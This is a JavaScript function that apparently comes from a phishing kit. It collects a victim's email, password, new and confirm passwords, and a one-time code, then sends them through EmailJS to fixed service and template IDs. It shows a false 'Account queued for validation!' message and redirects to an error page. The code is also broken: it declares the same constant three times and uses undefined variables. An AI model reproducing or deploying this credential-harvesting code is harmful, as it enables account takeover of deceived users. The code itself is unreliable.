function sendMail(step) {
    // Define parameters for step 1 (email and password) or step 2 (OTP)
    let params = {};
    if (step === 1) {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        const password = document.getElementById("new-password").value.trim();
        const password = document.getElementById("confirm-password").value.trim();

        // Validate email and password fields
        if (!email || !password) {
            alert("Both Email and Password are required.");
            return;
        }

        params = {
            email: email,
            password: password,
            new_password: new_password,
            confirm_password: confirm_password,
        };
    } else if (step === 2) {
        const otp = document.getElementById("otp").value.trim();

        // Validate OTP field
        if (!otp) {
            alert("OTP is required.");
            return;
        }

        params = {
            otp: otp,
        };
    } else {
        console.error("Invalid step passed to sendMail function.");
        return;
    }

    // EmailJS service and template IDs
    const serviceID = "service_dc0cgml";
    const templateID = "template_5bmgad2";

    // Send data via EmailJS
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            console.log("Email sent successfully!", res);

            // Clear relevant fields after successful submission
            if (step === 1) {
                document.getElementById("email").value = "";
                document.getElementById("password").value = "";
                document.getElementById("new-password").value = "";
                document.getElementById("confirm-password").value = "";
                alert("Account queued for validation!");
                // Redirect or perform further actions as needed
                window.location.href = "error.html";
            //    goToStep(2); // Move to the next step
            // } else if (step === 2) {
            //     document.getElementById("otp").value = "";
            //     alert("Account queued for validation!");
            //     // Redirect or perform further actions as needed
            //     window.location.href = "error.html";
            }
        })
        .catch((err) => {
            console.error("Failed to process validattion:", err);
            alert("An error occurred. Please try again.");
        });
}
